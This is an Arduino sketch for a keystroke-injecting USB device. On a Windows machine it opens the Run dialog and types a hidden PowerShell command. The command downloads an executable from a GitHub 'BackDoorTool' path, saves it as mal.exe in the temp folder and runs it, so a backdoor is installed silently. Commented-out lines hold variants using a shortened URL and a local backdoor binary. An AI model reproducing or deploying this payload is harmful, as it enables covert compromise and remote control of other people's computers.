#include<Keyboard.h>
void setup() {
  delay(2000);
  type(KEY_LEFT_GUI,false);
  type('d',false);
  Keyboard.releaseAll();
  delay(500);
  
  type(KEY_LEFT_GUI,false);
  type('r',false);
  Keyboard.releaseAll();
  delay(500);

  type(KEY_LEFT_CTRL,false);
  type(KEY_SPACE,false);
  Keyboard.releaseAll();
  delay(1000);

  type(KEY_LEFT_CTRL,false);
  type('a',false);
  Keyboard.releaseAll();
  delay(500);
  
  type(KEY_BACKSPACE,false);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print(F("powershell -windowstyle hidden "));
  delay(500);
  Keyboard.print(F("(new-object System.Net.WebClient).DownloadFile"));
  delay(500);
  Keyboard.print(F("('https://raw.githubusercontent.com/Hung-Jia-Jun/"));
  delay(500);
  Keyboard.print(F("python/master/BackDoorTool/dist/"));
  delay(500);
  Keyboard.print(F("server.exe','%TEMP%\\mal.exe');"));
  delay(500);
  Keyboard.print(F(" Start-Process \"%TEMP%\\mal.exe\""));
  
  //Keyboard.print(F("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://reurl.cc/GVzjEd','%TEMP%\\mal.exe'); Start-Process \"%TEMP%\\mal.exe\""));
  
  //print(F("powershell -windowstyle hidden \"C:\\Users\\Jason\\Scripts\\BackDoorTool\\dist\\backdoor_server.exe \" "));
  delay(1000);
  type(KEY_RETURN,false);
  Keyboard.releaseAll();
  Keyboard.end();
}
void type(int key, boolean release) {
  Keyboard.press(key);
  if(release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop(){}
